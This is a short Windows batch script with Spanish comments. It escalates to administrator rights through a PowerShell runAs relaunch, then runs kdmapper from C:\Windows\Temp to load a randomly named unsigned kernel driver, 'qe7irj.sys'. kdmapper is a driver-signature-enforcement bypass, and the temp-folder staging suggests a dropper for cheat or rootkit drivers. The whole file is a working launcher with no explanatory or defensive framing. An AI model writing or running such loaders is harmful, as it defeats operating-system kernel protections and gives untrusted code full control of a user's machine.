@echo off
:: Comprobar si el script está siendo ejecutado como administrador
NET SESSION >nul 2>&1
if %errorlevel% NEQ 0 (
    echo No se tiene privilegios de administrador. Reiniciando el script con privilegios elevados...
    :: Reiniciar el script como administrador
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs"
    exit /b
)

start "" "C:\Windows\Temp\kdmapper_Release" "C:\Windows\Temp\qe7irj.sys"
exit
